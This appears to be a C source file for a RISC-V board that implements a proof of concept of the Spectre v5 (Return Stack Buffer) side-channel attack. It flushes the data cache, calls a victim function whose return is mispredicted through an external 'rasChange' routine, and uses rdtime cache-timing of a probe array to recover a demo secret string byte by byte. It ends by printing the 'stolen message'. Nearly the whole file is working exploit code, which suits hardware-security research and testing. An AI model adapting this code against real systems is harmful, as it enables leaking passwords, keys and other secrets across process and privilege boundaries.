#include <stdio.h>
#include <stdint.h>

#define ATTACK_SAME_ROUNDS 20
#define SECRET_SZ 40
#define CACHE_HIT_THRESHOLD 85
#define L1_BLOCK_SZ_BYTES 64
#include "datatype.h"
#include "uart.h"

/* -------------------------------------------------------------------------- */
/*                               global varibles                              */
/* -------------------------------------------------------------------------- */
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char *secret = "The Magic Words are Squeamish Ossifrage.";
uint64_t temp;
uint8_t *p_array2 = array2;


/* -------------------------------------------------------------------------- */
/*                                 victim func                                */
/* -------------------------------------------------------------------------- */
void victimFunc(char *addr)
{
    extern void rasChange();
    uint64_t dummy = 0;
    rasChange();
    dummy = array2[*addr * L1_BLOCK_SZ_BYTES];
}
/* -------------------------------------------------------------------------- */
/*                                    main                                    */
/* -------------------------------------------------------------------------- */
int main(void)
{
    /* ----------------------------- local varibles ----------------------------- */
    uint64_t start, end;
    uint8_t dummy = 0;
    int diff_time = 0;
    int diff[256];
    unsigned int score[256];
    unsigned int max_score = 0;
    unsigned char max_score_char = 0;
    char secret_atk[SECRET_SZ];

    /* ------------------------------- setup uart ------------------------------- */
    uart_cfig.baudrate = BAUD;       // any integer value is allowed
    uart_cfig.parity = PARITY_NONE;     // PARITY_NONE / PARITY_ODD / PARITY_EVEN
    uart_cfig.stopbit = STOPBIT_1;      // STOPBIT_1 / STOPBIT_2
    uart_cfig.wordsize = WORDSIZE_8;    // from WORDSIZE_5 to WORDSIZE_8
    uart_cfig.txmode = ENABLE;          // ENABLE or DISABLE
    // open UART device with id = 0 (UART0)
    ck_uart_open(&uart0, 0);
    // initialize uart using uart_cfig structure
    ck_uart_init(&uart0, &uart_cfig);
    /* ----------------------------- end setup uart ----------------------------- */
    
    /* ---------------------------- start attack poc ---------------------------- */
    printf("================= This is a POC of spectre_v5 (Return Stack Buffer) ========================= \n");
    printf("the secret key is:%s \n", secret);

    for (uint64_t offset = 0; offset < SECRET_SZ; ++offset)
    {
        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for (uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound)
        {
            // flush L1 data cahce
            asm volatile("Dcache.ciall");

            // fence cache clear and victim function
            for (uint64_t i = 0; i < 1024; ++i)
            {
                asm volatile("nop");
            }

            // run the ras attack
            victimFunc(secret + offset);
            __asm__ volatile("ld fp, 32(sp)"); // Adjust the frame pointer
            __asm__ volatile("addi sp,sp,48"); // Adjust the stack pointer

            // cache measure and get secret info
            for (uint64_t i = 0; i < 256; ++i)
            {
                p_array2 = array2 + i * L1_BLOCK_SZ_BYTES;
                asm volatile(
                    "fence rw, rw\n" // Memory barrier
                    "rdtime %0"      // Read timestamp into output operand
                    : "=r"(start));
                asm volatile("fence rw, rw");
                asm volatile(
                    "lw %0, %1(%2)"
                    : "=r"(temp)
                    : "i"(0), "r"(p_array2));
                asm volatile(
                    "fence rw, rw\n" // Memory barrier
                    "rdtime %0"      // Read timestamp into output operand
                    : "=r"(end));
                diff[i] = (end - start);
                if (diff[i] < CACHE_HIT_THRESHOLD)
                {
                    score[i]++;
                }
            }
        }
        // calculate max score and get results
        for (int i = 2; i < 256; i++)
            if (score[i] > max_score)
            {
                max_score = score[i];
                max_score_char = i;
                diff_time = diff[i];
            }
        secret_atk[offset] = max_score_char;
        // show byte atk results
        printf("Reading No.%d byte\n", offset);
        printf("cache read time is %d,value is '%d',word is '%c'; score = %d\n", diff_time, max_score_char, max_score_char, max_score);
        // clear score
        for (int i = 0; i < 256; i++)
            score[i] = 0;
        max_score = 0;
        // read in the next secret
    }
    // show atk results
    printf("The stolen message is '%s'\n", secret_atk);
    printf("********************* spectre v5 end *********************\n\n");
    ck_uart_close(&uart0);
    while(1);
    return 0;
}
